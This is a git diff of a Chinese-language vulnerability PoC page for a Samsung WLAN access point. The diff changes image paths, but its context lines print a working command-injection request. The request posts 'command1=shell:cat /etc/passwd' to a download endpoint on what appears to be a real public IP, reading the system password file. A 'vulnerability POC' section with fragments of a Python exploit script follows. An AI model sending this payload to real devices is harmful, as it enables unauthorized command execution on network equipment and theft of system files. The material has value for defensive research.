@@ -20,11 +20,11 @@ title=="Samsung WLAN AP"
 
 登录页面如下
 
-![](images/202202110918151.png)
+![](../.gitbook/assets/202202110918151.png)
 
 请求包如下
 
-```plain
+```
 POST /(download)/tmp/a.txt HTTP/1.1
 Host: 175.199.182.152
 Connection: close
@@ -33,7 +33,7 @@ Content-Length: 48
 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
 ```
 
-![](images/202202110918410.png)
+![](../.gitbook/assets/202202110918410.png)
 
 ## 漏洞POC
 
@@ -97,4 +97,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202110918137.png)
+![](../.gitbook/assets/202202110918137.png)
